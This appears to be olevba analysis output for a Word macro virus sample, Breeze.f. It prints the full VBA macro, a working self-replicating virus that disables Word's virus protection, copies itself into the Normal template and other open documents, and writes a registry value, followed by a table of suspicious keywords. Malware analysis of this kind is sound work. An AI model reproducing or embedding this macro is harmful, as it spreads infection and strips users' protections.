olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Breeze.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Breeze.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aaaaa.bas 
in file: Virus.MSWord.Breeze.f - OLE stream: 'Macros/VBA/aaaaa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "aaaaa" Then Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "aaaaa", wdOrganizerObjectProjectItems
If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "aaaaa" Then Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "aaaaa", wdOrganizerObjectProjectItems
System.PrivateProfileString("", "HKEY_CURRENT_USER\", "weather") = "f0re's Macro Contest Contribution !"
End Sub

'weather (c)1999 f0re
'contribution to the linezer0 macro contest




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

